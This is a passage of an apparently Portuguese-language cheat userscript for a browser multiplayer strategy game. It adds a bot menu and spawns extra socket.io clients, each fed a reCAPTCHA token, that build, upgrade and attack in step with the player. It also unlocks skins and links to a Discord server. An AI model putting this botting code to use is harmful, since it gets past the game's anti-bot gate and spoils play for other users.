mainCanvas.addEventListener ? (window.addEventListener("mousewheel", zoom, !1),
mainCanvas.addEventListener("DOMMouseScroll", zoom, !1)) : window.attachEvent("onmousewheel", zoom);
window.addEventListener("mousemove", gameInput, !1);
window.addEventListener('keyup', function (a) {a = a.keyCode ? a.keyCode : a.which;if (a == 107) {(maxScreenHeight = 15000, maxScreenWidth = 30000, resize(true));};if (a == 109) {(maxScreenHeight = 1080, maxScreenWidth = 1920, resize(true));};});

/*PLAYERS*/
function players3() {
var nPlayers = document.createElement("div")
var play = setInterval(function() {
nPlayers.id = "TotalMembers"
document.getElementById("statContainer").appendChild(nPlayers)
nPlayers.innerText = "Players: " + users.length;},1000)}
setTimeout(players3, 10);
//===================Fim===================//

//===================Hotbar===================//
window.themeSelect = 0;
window.useTheme = false;
window.autoDefense = false;
window.UIList = window.UIList || [];
window.initFuncs = window.initFuncs || [];
window.statusItems = window.statusItems || [];
window.UIList.push({
//////////////////////////////////////////////////////////////////////////////////////////
level:0,x:0,html:'<div id="res" onclick=setRes()>Res<span class="botao">(0)</span></div>'}, {
level:0,x:1,html: '<div id="fps" onclick=setFPS()>FPS</div>'}, {
level:0,x:2,html:'<div onclick=botsmais()>+Bots+</div>'},{
level:0,x:3,html:'<div id="player2" ()>Bots:</div>'},{
level:0,x:4,html:'<div onclick=botsmenos()>-Bots-</div>'},{
level:0,x:5,html: '<div id=auto onclick=olharbot()>Olhar Bot: <span class="botao">Off</span></div>'},{
level:0,x:6,html:'<div onclick=buildbase0()>ATK Auto</div>'},{
level:0,x:7,html:'<div onclick=buildbase7()>Base auto</div>'},{
//////////////////////////////////////////////////////////////////////////////////////////
level:1,x:0,html:'<div onclick=buildbase1()>Build Gens</div>'},{
level:1,x:1,html:'<div onclick=buildbase2()>Sell Barrack</div>'},{
level:1,x:2,html:'<div onclick=buildbase3()>Build Barracks</div>'},{
level:1,x:3,html:'<div onclick=buildbase4()>Barrack Soldiers</div>'},{
level:1,x:4,html:'<div onclick=buildbase5()>Build AntiTanks</div>'},{
level:1,x:5,html:'<div onclick=buildbase6()>Full Atk</div>'},{
//////////////////////////////////////////////////////////////////////////////////////////
level:2,x:0,html:'<div onclick=Discord()>Discord</div>'},{
level:2,x:1,html:'<div </div><span id="ThemeSelect" onclick=SelectTheme()>Theme:<span><span class="botao"> Ultron</span></div>'},{
});
//===================Fim===================//

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//===================Add Bot===================//
window.botsmais=function() {var xy = parseInt(prompt("Quantidade de bot"));BotAmout(xy,name);}
//===================Fim===================//

//===================Tirar Bot===================//
window.botsmenos=function() {window.sockets.forEach(socket => {socket.close();var id=0})};
//===================FIm===================//

//===================Ful atk auto===================//
window.buildbase0 = function(){
if (!window.sockets) return alert("no sockets");
setTimeout(function(){ gens();},1000);setTimeout(function(){ gens();},10000);setTimeout(function(){ gens();},20000);setTimeout(function(){ gens();},30000);setTimeout(function(){ gens();},50000);setTimeout(function(){ walls();},60000);setTimeout(function(){ walls();},63000);setTimeout(function(){ micro();},80000);setTimeout(function(){ micro();},95000);setTimeout(function(){ micro();},99999);setTimeout(function(){ upgens();},100000);setTimeout(function(){ upgens();},130000);setTimeout(function(){ upgens();},155000);setTimeout(function(){ upgens();},160000);setTimeout(function(){ command();},170000);setTimeout(function(){ command();},180000);setTimeout(function(){ armory();},190000);setTimeout(function(){ barracks1();},195000);setTimeout(function(){ siege();},230000);setTimeout(function(){ siege();},234000);setTimeout(function(){ barracks2();},235000);setTimeout(function(){ barracks2();},240000);setTimeout(function(){ upbarracks();},250000);setTimeout(function(){ upbarracks();},255000);setTimeout(function(){ upbarracks();},260000);setTimeout(function(){ upbarracks();},270000);setTimeout(function(){ upbarracks();},280000);
function gens(){window.sockets.forEach(socket => {socket.emit("1", 4.73, 245, 3), socket.emit("1", 5.0025, 245, 3), socket.emit("1", 5.275, 245, 3), socket.emit("1", 5.5475, 245, 3), socket.emit("1", 5.82, 245, 3), socket.emit("1", 6.0925, 245, 3), socket.emit("1", 6.365, 245, 3), socket.emit("1", 6.6375, 245, 3), socket.emit("1", 6.91, 245, 3), socket.emit("1", 7.1825, 245, 3), socket.emit("1", 7.455, 245, 3), socket.emit("1", 7.7275, 245, 3), socket.emit("1", 8.0025, 245, 3), socket.emit("1", 8.275, 245, 3), socket.emit("1", 8.5475, 245, 3), socket.emit("1", 8.82, 245, 3), socket.emit("1", 9.0925, 245, 3), socket.emit("1", 9.3675, 245, 3), socket.emit("1", 9.64, 245, 3), socket.emit("1", 9.9125, 245, 3), socket.emit("1", 10.1875, 245, 3), socket.emit("1", 10.4625, 245, 3), socket.emit("1", 10.7375, 245, 3), socket.emit("1", 5.64, 180, 3), socket.emit("1", 5.999, 180, 3), socket.emit("1", 6.51, 185, 3), socket.emit("1", 7.05, 185, 3), socket.emit("1", 7.6, 185, 3), socket.emit("1", 8.15, 185, 3), socket.emit("1", 8.675, 185, 3), socket.emit("1", 9.225, 185, 3), socket.emit("1", 9.78, 185, 3), socket.emit("1", 10.325, 185, 3), socket.emit("1", 5.36, 130, 3), socket.emit("1", 6.275, 130, 3), socket.emit("1", 6.775, 130, 3), socket.emit("1", 7.3, 130, 3), socket.emit("1", 7.85, 130, 3), socket.emit("1", 8.4, 130, 3), socket.emit("1", 8.925, 130, 3), socket.emit("1", 9.5, 130, 3), socket.emit("1", 10.05, 130, 3),socket.emit("1",4.725,130,7)})}
function walls(){window.sockets.forEach(socket => {socket.emit("1", 7.86, 311, 1); socket.emit("1", 8.06, 311, 1); socket.emit("1", 8.26, 311, 1); socket.emit("1", 8.46, 311, 1); socket.emit("1", 8.66, 311, 1); socket.emit("1", 8.86, 311, 1); socket.emit("1", 9.06, 311, 1); socket.emit("1", 9.26, 311, 1); socket.emit("1", 9.46, 311, 1); socket.emit("1", 9.66, 311, 1); socket.emit("1", 9.86, 311, 1); socket.emit("1", 10.28, 311, 1); socket.emit("1", 10.70, 311, 1); socket.emit("1", 10.90, 311, 1); socket.emit("1", 11.10, 311, 1); socket.emit("1", 11.30, 311, 1); socket.emit("1", 11.72, 311, 1); socket.emit("1", 12.14, 311, 1); socket.emit("1", 12.34, 311, 1); socket.emit("1", 12.54, 311, 1); socket.emit("1", 12.74, 311, 1); socket.emit("1", 12.94, 311, 1); socket.emit("1", 13.14, 311, 1); socket.emit("1", 13.34, 311, 1); socket.emit("1", 13.54, 311, 1); socket.emit("1", 13.74, 311, 1); socket.emit("1", 13.94, 311, 1);})}
function barracks1(){window.sockets.forEach(socket => {socket.emit("1",10.07,311,8);})}
function barracks2(){window.sockets.forEach(socket => {socket.emit("1",10.49,311,8); socket.emit("1",11.51,311,8); socket.emit("1",11.93,311,8);})}
function upbarracks(){window.sockets.forEach(socket => {for (var i = 0; i < units.length; ++i){if(2 == units[i].type && "square" == units[i].shape){socket.emit("4", units[i].id, 0)}}})}
function micro(){window.sockets.forEach(socket => {for (var i = 0; i < units.length; ++i){if(3 == units[i].type && "circle" == units[i].shape){socket.emit("4", units[i].id, 1)}}})}
function upgens(){window.sockets.forEach(socket => {for (var i = 0; i < units.length; ++i){if( 0 == units[i].type && "hexagon" == units[i].shape){socket.emit("4", units[i].id, 0)}}})}
function command(){window.sockets.forEach(socket => {socket.emit("4",0,0,1)})}
function siege(){window.sockets.forEach(socket => {for (var i = 0; i < units.length; ++i){if(2 == units[i].type && "square" == units[i].shape ){socket.emit("4", units[i].id, 2);}}})}
function armory() {for (var i = 0; i < units.length; ++i) {if (0 === units[i].type && "circle" == units[i].shape) {for (var z = 0; z < window.sockets.length; z++){sockets[z].emit("4", units[i].id, 0)}}}}
}
//===================Fim===================//

//===================Gens===================//
window.buildbase1 = function(){
if (!window.sockets) return alert("no sockets");
window.sockets.forEach(socket => {
socket.emit("1",4.73, 243.85, 3); socket.emit("1",5, 243.85, 3); socket.emit("1",5.28, 243.85, 3); socket.emit("1",5.55, 243.85, 3); socket.emit("1",5.82, 243.85, 3); socket.emit("1",6.09, 243.85, 3); socket.emit("1",6.37, 243.85, 3); socket.emit("1",6.64, 243.85, 3); socket.emit("1",6.91, 243.84, 3); socket.emit("1",7.18, 243.85, 3); socket.emit("1",7.46, 243.85, 3); socket.emit("1",7.73, 243.85, 3); socket.emit("1",8, 243.85, 3); socket.emit("1",8.28, 243.85, 3); socket.emit("1",8.55, 243.85, 3); socket.emit("1",8.82, 243.85, 3); socket.emit("1",9.09, 243.85, 3); socket.emit("1",9.37, 243.85, 3); socket.emit("1",9.64, 243.85, 3); socket.emit("1",9.91, 243.85, 3); socket.emit("1",10.19, 243.84, 3); socket.emit("1",10.46, 243.86, 3); socket.emit("1",10.74, 243.85, 3); socket.emit("1",6.28, 132, 3); socket.emit("1",6.78, 132, 3); socket.emit("1",7.86, 306, 1); socket.emit("1",7.3, 132, 3); socket.emit("1",7.85, 132, 3); socket.emit("1",8.4, 132, 3); socket.emit("1",8.93, 132, 3); socket.emit("1",9.5, 132, 3); socket.emit("1",10.05, 132, 3); socket.emit("1",8.06, 306, 1); socket.emit("1",10.6, 132, 3); socket.emit("1",4.81, 132, 3); socket.emit("1",5.36, 132, 3); socket.emit("1",8.26, 306, 1); socket.emit("1",8.46, 306, 1); socket.emit("1",8.66, 306, 1); socket.emit("1",8.86, 306, 1); socket.emit("1",9.06, 306, 1); socket.emit("1",9.26, 306, 1); socket.emit("1",9.46, 306, 1); socket.emit("1",9.66, 306, 1); socket.emit("1",9.86, 306, 1); socket.emit("1",10.28, 306, 1); socket.emit("1",10.7, 306, 1); socket.emit("1",10.9, 306, 1); socket.emit("1",11.1, 306, 1); socket.emit("1",11.3, 306, 1); socket.emit("1",12.14, 305.99, 1); socket.emit("1",12.34, 306, 1); socket.emit("1",12.54, 306, 1); socket.emit("1",12.74, 306, 1); socket.emit("1",12.94, 306, 1); socket.emit("1",13.14, 306, 1); socket.emit("1",13.34, 306, 1); socket.emit("1",13.54, 306, 1); socket.emit("1",13.74, 306, 1); socket.emit("1",13.94, 306, 1); socket.emit("1",-1.7, 185.55, 4); socket.emit("1",10.07, 310, 8); socket.emit("1",10.49, 306, 1); socket.emit("1",-2.24, 185.14, 4); socket.emit("1",-2.8, 181.72, 4); socket.emit("1",2.92, 181.19, 4); socket.emit("1",2.4, 186.49, 4); socket.emit("1",1.85, 184.66, 4); socket.emit("1",1.29, 185.73, 4); socket.emit("1",0.74, 184.92, 4); socket.emit("1",0.21, 186.65, 4); socket.emit("1",-0.29, 184.6, 4); socket.emit("1",-0.63, 183.85, 4); socket.emit("1",-1.18, 184.61, 4); socket.emit("1",11.72, 306, 1); socket.emit("1",11.93, 310, 8); socket.emit("1",11.51, 306, 1);
})}
//===================Fim===================//

//===================Sell barraca sieg===================//
window.buildbase2 = function() {
if (!window.sockets) return alert("no sockets");
window.sockets.forEach(socket => {
for (var a = [], d = 0; d < units.length; ++d) units[d].type === 2 && getUnitFromPath(units[d].uPath).name === 'Siege Factory' && a.push(units[d].id);socket.emit("3", a)
})}
//===================Fim===================//

//===================Build Barraca===================//
window.buildbase3 = function() {
if (!window.sockets) return alert("no sockets");
window.sockets.forEach(socket => {
socket.emit("1",10.07,311,8);socket.emit("1",10.49,311,8); socket.emit("1",11.51,311,8); socket.emit("1",11.93,311,8);
})}
//===================Fim===================//

//===================Barraca soldados//
window.buildbase4 = function(){
if (!window.sockets) return alert("no sockets");
window.sockets.forEach(socket => {
for (var i = 0; i < units.length; ++i) {if (2 === units[i].type && "square" == units[i].shape) {socket.emit("4", units[i].id, 0);}}
})}
//===================fim===================//

//===================Build Ant tanks===================//
window.buildbase5 = function() {
if (!window.sockets) return alert("no sockets");
window.sockets.forEach(socket => {
for (var a = [], d = 0; d < units.length; ++d) {if(units[d].dir == 4.86) {if(units[d].uPath==4){a.push(units[d].id);socket.emit("3", a)}}}
for (a = [], d = 0; d < units.length; ++d) {if(units[d].dir == 5.11) {if(units[d].uPath==4){a.push(units[d].id);socket.emit("3", a)}}}
for (a = [], d = 0; d < units.length; ++d) {if(units[d].dir == 5.36) {if(units[d].uPath==4){a.push(units[d].id);socket.emit("3", a)}}}
for (a = [], d = 0; d < units.length; ++d) {if(units[d].dir == 5.61) {if(units[d].uPath==4){a.push(units[d].id);socket.emit("3", a)}}}
for (a = [], d = 0; d < units.length; ++d) {if(units[d].dir == 3.86) {if(units[d].uPath==4){a.push(units[d].id);socket.emit("3", a)}}}
for (a = [], d = 0; d < units.length; ++d) {if(units[d].dir == 4.11) {if(units[d].uPath==4){a.push(units[d].id);socket.emit("3", a)}}}
for (a = [], d = 0; d < units.length; ++d) {if(units[d].dir == 4.36) {if(units[d].uPath==4){a.push(units[d].id);socket.emit("3", a)}}}
for (a = [], d = 0; d < units.length; ++d) {if(units[d].dir == 4.61) {if(units[d].uPath==4){a.push(units[d].id);socket.emit("3", a)}}}
socket.emit("1",-1.8, 243.85, 5);socket.emit("1",-1.32, 243.85, 5);socket.emit("1",-1.03, 243.85, 5);socket.emit("1",-0.73, 243.85, 5);socket.emit("1",-2.08, 243.85, 5);socket.emit("1",-2.38, 243.84, 5);socket.emit("1",-1.56, 211.47, 4);
    window.sockets.forEach(socket => {for (var i = 0; i < units.length; ++i) 0 == units[i].type && 4 == units[i].turretIndex && "circle" == units[i].shape && socket.emit("4", units[i].id, 1)})
})}
//===================Fim===================//

//===================Build ful atk===================//
window.buildbase6 = function(){
if (!window.sockets) return alert("no sockets");
window.sockets.forEach(socket => {
socket.emit("1",4.725,130,7),socket.emit("1",5.245,130,4), socket.emit("1",5.715,130,4), socket.emit("1",6.185,130,4), socket.emit("1",6.655,130,4), socket.emit("1",7.13,130,4), socket.emit("1",7.6,130,4), socket.emit("1",1.85,130,4), socket.emit("1",2.32,130,4), socket.emit("1",2.79,130,4), socket.emit("1",3.265,130,4), socket.emit("1",3.735,130,4), socket.emit("1",4.205,130,4), socket.emit("1",5.06,185,4), socket.emit("1",5.4,185,4), socket.emit("1",5.725,190,4), socket.emit("1",6.045,186,4), socket.emit("1",6.374,185,4), socket.emit("1",6.7215,189.5,4), socket.emit("1",7.0425,188.5,4), socket.emit("1",7.365,185,4), socket.emit("1",7.712,187.45,4), socket.emit("1",8.035,188.5,4), socket.emit("1",8.36,185,4), socket.emit("1",2.425,188,4), socket.emit("1",2.75,190,4), socket.emit("1",3.075,184,4), socket.emit("1",3.42,186,4), socket.emit("1",3.74,190,4), socket.emit("1",4.06,186,4), socket.emit("1",4.39,185,4), socket.emit("1",4.8625,245,4), socket.emit("1",5.1125,245,4), socket.emit("1",5.3625,245,4), socket.emit("1",5.6125,245,4), socket.emit("1",5.8625,245,4), socket.emit("1",6.1125,245,4), socket.emit("1",6.3625,245,4), socket.emit("1",6.6125,245,4), socket.emit("1",6.8625,245,4), socket.emit("1",7.14,245,4), socket.emit("1",7.39,245,4), socket.emit("1",7.64,246,4), socket.emit("1",7.89,246,4), socket.emit("1",8.14,246,4), socket.emit("1",8.39,246,4), socket.emit("1",8.635,246,4), socket.emit("1",8.885,246,4), socket.emit("1",2.5825,245,4), socket.emit("1",2.8625,245,4), socket.emit("1",3.1125,245,4), socket.emit("1",3.3625,245,4), socket.emit("1",3.6125,245,4), socket.emit("1",3.8625,245,4), socket.emit("1",4.1125,245,4), socket.emit("1",4.3625,245,4), socket.emit("1",4.6125,245,4), socket.emit("1",7.86,311,1), socket.emit("1",8.06,311,1), socket.emit("1",8.26,311,1), socket.emit("1",8.46,311,1), socket.emit("1",8.66,311,1), socket.emit("1",8.86,311,1), socket.emit("1",9.06,311,1), socket.emit("1",9.26,311,1), socket.emit("1",9.46,311,1), socket.emit("1",9.66,311,1), socket.emit("1",9.86,311,1), socket.emit("1",10.28,311,1), socket.emit("1",10.70,311,1), socket.emit("1",10.90,311,1), socket.emit("1",11.10,311,1), socket.emit("1",11.30,311,1), socket.emit("1",11.72,311,1), socket.emit("1",12.14,311,1), socket.emit("1",12.34,311,1), socket.emit("1",12.54,311,1), socket.emit("1",12.74,311,1), socket.emit("1",12.94,311,1), socket.emit("1",13.14,311,1), socket.emit("1",13.34,311,1), socket.emit("1",13.54,311,1), socket.emit("1",13.74,311,1), socket.emit("1",13.94,311,1), socket.emit("1",10.07,311,8), socket.emit("1",10.49,311,8), socket.emit("1",11.51,311,8), socket.emit("1",11.93,311,8);
})}
//===================Fim===================//

//===================Base nova===================//
window.buildbase7 =function(){
setTimeout(function() {Gens();}, 10); setTimeout(function() {Gens();}, 35000); setTimeout(function() {Upgens();}, 66000); setTimeout(function() {Upgens();}, 92000); setTimeout(function() {Upgens();}, 120000); setTimeout(function() {wall();}, 135000); setTimeout(function() {micro();}, 150000); setTimeout(function() {barraca();}, 156000); setTimeout(function() {barracaup();}, 176000); setTimeout(function() {house();}, 180000); function Gens() {window.sockets.forEach(socket => {socket.emit("1", 4.73, 243.85, 3); socket.emit("1", 5, 243.85, 3); socket.emit("1", 5.28, 243.85, 3); socket.emit("1", 5.55, 243.85, 3); socket.emit("1", 5.82, 243.85, 3); socket.emit("1", 6.09, 243.85, 3); socket.emit("1", 6.37, 243.85, 3); socket.emit("1", 6.64, 243.85, 3); socket.emit("1", 6.91, 243.84, 3); socket.emit("1", 7.18, 243.85, 3); socket.emit("1", 7.46, 243.85, 3); socket.emit("1", 7.73, 243.85, 3); socket.emit("1", 8, 243.85, 3); socket.emit("1", 8.28, 243.85, 3); socket.emit("1", 8.55, 243.85, 3); socket.emit("1", 8.82, 243.85, 3); socket.emit("1", 9.09, 243.85, 3); socket.emit("1", 9.37, 243.85, 3); socket.emit("1", 9.64, 243.85, 3); socket.emit("1", 9.91, 243.85, 3); socket.emit("1", 10.19, 243.84, 3); socket.emit("1", 10.46, 243.86, 3); socket.emit("1", 10.74, 243.85, 3); socket.emit("1", 6.28, 132, 3); socket.emit("1", 6.78, 132, 3); socket.emit("1", 7.3, 132, 3); socket.emit("1", 7.85, 132, 3); socket.emit("1", 8.4, 132, 3); socket.emit("1", 8.93, 132, 3); socket.emit("1", 9.5, 132, 3); socket.emit("1", 10.05, 132, 3); socket.emit("1", 10.6, 132, 3); socket.emit("1", 4.81, 132, 3); socket.emit("1", 5.36, 132, 3);}) }}
function Upgens(){window.sockets.forEach(socket => { for (var i = 0; i < units.length; ++i) { if (0 == units[i].type && "hexagon" == units[i].shape) { socket.emit("4", units[i].id, 0) } } })}
function wall(){window.sockets.forEach(socket => { socket.emit("1", 8.26, 306, 1); socket.emit("1", 8.46, 306, 1); socket.emit("1", 8.66, 306, 1); socket.emit("1", 8.86, 306, 1); socket.emit("1", 9.06, 306, 1); socket.emit("1", 9.26, 306, 1); socket.emit("1", 9.46, 306, 1); socket.emit("1", 9.66, 306, 1); socket.emit("1", 9.86, 306, 1); socket.emit("1", 10.28, 306, 1); socket.emit("1", 10.7, 306, 1); socket.emit("1", 10.9, 306, 1); socket.emit("1", 11.1, 306, 1); socket.emit("1", 11.3, 306, 1); socket.emit("1", 12.14, 305.99, 1); socket.emit("1", 12.34, 306, 1); socket.emit("1", 12.54, 306, 1); socket.emit("1", 12.74, 306, 1); socket.emit("1", 12.94, 306, 1); socket.emit("1", 13.14, 306, 1); socket.emit("1", 13.34, 306, 1); socket.emit("1", 13.54, 306, 1); socket.emit("1", 13.74, 306, 1); socket.emit("1", 13.94, 306, 1); socket.emit("1", 10.49, 306, 1); socket.emit("1", 11.72, 306, 1); socket.emit("1", 11.51, 306, 1); socket.emit("1", 8.06, 306, 1); socket.emit("1", 7.86, 306, 1); }) } function micro(){window.sockets.forEach(socket => {for (var i = 0; i < units.length; ++i){if(3 == units[i].type && "circle" == units[i].shape){socket.emit("4", units[i].id, 1)}}})}
function barraca(){window.sockets.forEach(socket => {socket.emit("1", 10.07, 310, 8);socket.emit("1", 11.93, 310, 8);})}
function barracaup(){window.sockets.forEach(socket => {for (var i = 0; i < units.length; ++i){if(2 == units[i].type && "square" == units[i].shape){socket.emit("4", units[i].id, 0)}}})}
function house(){window.sockets.forEach(socket => {socket.emit("1", -2.24, 185.14, 4);
socket.emit("1", -2.8, 181.72, 4); socket.emit("1", 2.92, 181.19, 4); socket.emit("1", 2.4, 186.49, 4); socket.emit("1", 1.85, 184.66, 4); socket.emit("1", 1.29, 185.73, 4); socket.emit("1", 0.74, 184.92, 4); socket.emit("1", 0.21, 186.65, 4); socket.emit("1", -0.29, 184.6, 4); socket.emit("1", -0.63, 183.85, 4); socket.emit("1", -1.18, 184.61, 4); socket.emit("1", -1.7, 185.55, 4);} )}

//===================Fim===================//

//==================Discord===================//
window.Discord = function() {
    bots = 1;
for (let i = 0; i < bots; i++) {
   window.open("https://discord.gg/nvPtDDMgxp")
}}
//===================Fim===================//

//===================Olhar Bot===================//
window.olharbot = function () {
var elaa = document.getElementById('auto');
if (autoDefense) {
autoDefense = false
elaa.innerHTML = 'Olhar Bot: <span class="botao">Off</span>'
clearInterval(teste)
} else {
autoDefense = true;
elaa.innerHTML = 'Olhar Bot: <span class="botao">On</span>';
window.teste = setInterval(autodefesa, 50)
function autodefesa() {
if (usersWithTag() !== 0) {
for (i = lastAlly, e = users, h = e.length * 2; i < h; ++i) {
if (i == e.length) {i = 0;}
if (i !== 0 && users[i].sid !== player.sid && users[i].name.startsWith(player.name)) {
camX = users[i].x - player.x;
camY = users[i].y - player.y;
if (i == e.length) { lastAlly = 0; } else { lastAlly = 1 + i; }
break;
}}}};}}
//===================Fim===================//

//===================Resolução===================//
var resolution = 1;
var rate = 250;
function setFPS() {if (rate === 0) {rate = 1} else {rate = 0;}}
window.removeEventListener("mousemove", gameInput);
window.gameInput = function (a) {
a.preventDefault();
a.stopPropagation();
mouseX = a.clientX * resolution;
mouseY = a.clientY * resolution;
};
window.addEventListener("mousemove", gameInput, false);
window.removeEventListener("resize", resize);
window.resize = function (n) {
screenWidth = window.innerWidth * resolution;
screenHeight = window.innerHeight * resolution;
scaleFillNative = MathMAX(screenWidth / maxScreenWidth, screenHeight / maxScreenHeight);
if (n !== true) {
mainCanvas.width = screenWidth;
mainCanvas.height = screenHeight;
mainCanvas.style.width = (screenWidth / resolution) + "px";
mainCanvas.style.height = (screenHeight / resolution) + "px";
};
mainContext.setTransform(scaleFillNative, 0, 0, scaleFillNative, Math.floor((screenWidth - maxScreenWidth * scaleFillNative) / 2), Math.floor((screenHeight - maxScreenHeight * scaleFillNative) / 2));
player || renderBackground();
};
window.setRes = function () {
var el = document.getElementById('res');
if (resolution === 1) {resolution = .6;el.textContent = '(1)';
} else if (resolution === .6) {resolution = .05;el.textContent = '(2)';
} else if (resolution === .05) {resolution = .015;el.textContent = '(3)';
}else if (resolution === .015) {resolution = 1;el.textContent = '(4)';
};resize();};
//===================Fim===================//

//===================Fps===================//
window.setFPS = function() {
    var el = document.getElementById('fps');
    if (rate === 0) {
        el.textContent = '45 FPS'
        rate = 22;
    } else if (rate === 22) {
        el.textContent = '40 FPS'
        rate = 25;
    } else if (rate === 25) {
        el.textContent = '35 FPS'
        rate = 28;
    } else if (rate === 28) {
        el.textContent = '30 FPS';
        rate = 33;
    } else if (rate === 33) {
        el.textContent = '25 FPS';
        rate = 40;
    } else if (rate === 40) {
        el.textContent = '20 FPS';
        rate = 50;
    } else if (rate === 50) {
        el.textContent = '15 FPS';
        rate = 100;
    } else {
        el.textContent = 'Un FPS';
        rate = 0;
    }
    window.statusBar();
}
//===================Fim===============================//

//===================Função dos bot
function players2() {var pls = document.createElement('player2');var pls2 = setInterval(function() {document.getElementById("player2").innerHTML = "Bots: <span class='botao'>" + usersWithTag()}, 1000)};setTimeout(players2, 1000);
function playersLinked(a, d) {if (a.sid == player.sid && d.name.startsWith(player.name)) {return true}}
function usersWithTag() {if (users.lenght !== 0) {for (var o = [], i = 0, e = users; i < e.length; ++i) {if (users[i].sid !== player.sid && users[i].name.startsWith(player.name)) {o.push(users[i])}}return o.length}else {return 0}}
function selUnitsMidPoint() {x = 0;y = 0;for (i = 0, a = selUnits; i < a.length; ++i) {y = selUnits[i].y + y;x = selUnits[i].x + x}return [x / a.length, y / a.length]}
function upgradeSelUnits(firstUnit,upgrade){var firstUnitName = window.getUnitFromPath(firstUnit.uPath).name;for(var i=0;i<window.selUnits.length;i++){var unit = window.selUnits[i];if(window.getUnitFromPath(unit.uPath).name==firstUnitName){socket.emit("4",unit.id,upgrade);for (var b = 0; b < window.sockets.length; b++){window.sockets[b].emit("4",unit.id,upgrade)}}}}
sellSelUnits = function() {
if (selUnits.length) {for (var a = [], d = 0; d < selUnits.length; ++d)a.push(selUnits[d].id);socket.emit("3", a);for(var i=0; i<window.sockets.length; i++){sockets[i].emit("3", a)}}
}
moveSelUnits = function (){
if (selUnits.length) {
var a = player.x + targetDst * MathCOS(targetDir) + camX
, d = player.y + targetDst * MathSIN(targetDir) + camY
, c = 1;
if (c && 1 < selUnits.length)
for (var b = 0; b < users.length; ++b)
if (UTILS.pointInCircle(a, d, users[b].x, users[b].y, users[b].size)) {
c = 0;
break}
var g = -1;
if (c)
for (b = 0; b < units.length; ++b)
if (units[b].onScreen && units[b].owner != player.sid && UTILS.pointInCircle(a, d, units[b].x, units[b].y, units[b].size)) {
c = 0;
g = units[b].id;
break}
1 == selUnits.length && (c = 0);
var e = [];
for (b = 0; b < selUnits.length; ++b)
e.push(selUnits[b].id);
socket.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d), e,joinEnabled?(0):(c),g)
for(var i=0; i<window.sockets.length; i++){sockets[i].emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d), e,joinEnabled?(0):(c),g)}}}
sendUnit = function(a) {
socket && gameState && activeUnit && !activeUnit.dontPlace && socket.emit("1", UTILS.roundToTwo(activeUnitDir), UTILS.roundToTwo(activeUnitDst), a);
window.sockets.forEach(socket => {socket.emit("1", UTILS.roundToTwo(activeUnitDir), UTILS.roundToTwo(activeUnitDst), a);})}
upgradeUnit = function(a) {
socket && gameState && (1 == selUnits.length ? socket.emit("4", selUnits[0].id, a) : (activeBase) ? (a == 0 && activeBase.sid == player.sid ? (socket.emit("4", 0, a, 1)) : (handleActiveBaseUpgrade(activeBase.sid, activeBase.upgrades[a].name))) : (upgradeSelUnits(selUnits[0], a)))
window.sockets.forEach(socket => {socket && gameState && (1 == selUnits.length ? socket.emit("4", selUnits[0].id, a) : activeBase && activeBase.sid == player.sid && socket.emit("4", 0, a, 1));})}
toggleSelUnit = function() {
if (player && !activeUnit && units) {var a = (player.x || 0) - maxScreenWidth / 2 + camX, d = (player.y || 0) - maxScreenHeight / 2 + camY, c = player.x - a + targetDst * MathCOS(targetDir) + camX, b = player.y - d + targetDst * MathSIN(targetDir) + camY; disableSelUnit(); var g = 4 >= MathABS(c - mouseStartX + (b - mouseStartY)), e = !1; activeBase = null; if (g) for (var h = 0; h < users.length; ++h)if (0 <= users[h].size - UTILS.getDistance(c, b, users[h].x - a, users[h].y - d)) { activeBase = users[h]; forceUnitInfoUpdate = !0; break } if (!activeBase) {activeBase = null;for (h = 0; h < units.length; ++h)if (users[getUserBySID(units[h].owner)] !== undefined && users[getUserBySID(units[h].owner)].name.startsWith(player.name) === true || units[h].owner == player.sid) if (g) { if (0 <= units[h].size - UTILS.getDistance(c, b, units[h].x - a, units[h].y - d)) { selUnits.push(units[h]); var f = getUnitFromPath(selUnits[0].uPath); f && (selUnits[0].info = f, "Unit" == f.typeName && (e = !0)); break } } else UTILS.pointInRect(units[h].x - a, units[h].y - d, mouseStartX, mouseStartY, c - mouseStartX, b - mouseStartY) && (selUnits.push(units[h]), f = getUnitFromPath(selUnits[selUnits.length - 1].uPath)) && (selUnits[selUnits.length - 1].info = f, "Unit" == f.typeName && (e = !0));if (selUnits.length) { for (h = selUnits.length - 1; 0 <= h; --h)e && "Tower" == selUnits[h].info.typeName ? selUnits.splice(h, 1) : e || "Unit" != selUnits[h].info.typeName || selUnits.splice(h, 1); selUnitType = e ? "Unit" : "Tower"; 1500 < selUnits.length && (selUnits.length = 1500) }} updateSelUnitViews()}}
setSelUnitGather = function() {
if (selUnits.length) {for (var a = player.x + targetDst * MathCOS(targetDir) + camX, d = player.y + targetDst * MathSIN(targetDir) + camY, c = [], b = 0; b < selUnits.length; ++b)void 0 != selUnits[b].info.unitSpawn && (selUnits[b].gatherPoint = [a, d],c.push(selUnits[b].id));socket.emit("6", a, d, c);for (var i = 0; i < window.sockets.length; i++){sockets[i].emit("6", a, d, c)}}}

window.sockets = [];
window.unlockSkins();
var id=0;
window.newSocket=function() {
window.socketBot = io.connect(socket.io.uri, {
query: "cid=" + UTILS.getUniqueID() + "&rmid=" + lobbyRoomID,
});
window.sockets.push(window.socketBot);
grecaptcha.execute("6Ldh8e0UAAAAAFOKBv25wQ87F3EKvBzyasSbqxCE").then(function(a) {
sockets[id].emit("spawn", {
name:"𝒟𝑀 "+userNameInput.value+'{'+id+'}',
skin: 0
}, a);
id++;
});
}
function BotAmout(number, botName) {for (var i = 0; i < number; i++) {newSocket(botName);}}
//===================Fim===================//

//===================Centralizar===================//
function Centralizar() {
if(player.x==null){player.x=0};if(player.y==null){player.y=0};
for (var e = [], b = 0; b < Math.floor(selUnits.length-0); ++b) e.push(selUnits[b].id);socket.emit("5", (player.x)-1, (player.y)+1, e, 0, -1);
for (var e = [], b = 0; b < Math.floor(selUnits.length-0); ++b) e.push(selUnits[b].id);socket.emit("5", (player.x)+1, (player.y)-1, e, 0, -1);
for (var e = [], b = 0; b < Math.floor(selUnits.length-0); ++b) e.push(selUnits[b].id);socket.emit("5", (player.x)*1, (player.y)*1, e, 0, -1);
for (var e = [], b = 0; b < Math.floor(selUnits.length-0); ++b) e.push(selUnits[b].id);socket.emit("5", (player.x), (player.y), e, 0, -1);
var X=[],Y=[];
